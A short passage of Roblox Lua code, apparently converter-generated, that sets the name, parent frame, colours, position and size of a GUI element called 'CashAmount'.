CashAmount.Name = "CashAmount"
CashAmount.Parent = Frame
CashAmount.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CashAmount.BorderColor3 = Color3.fromRGB(0, 0, 0)
CashAmount.Position = UDim2.new(0.42397783, 0, 0.25454835, 0)
CashAmount.Size = UDim2.new(0, 83, 0, 16)
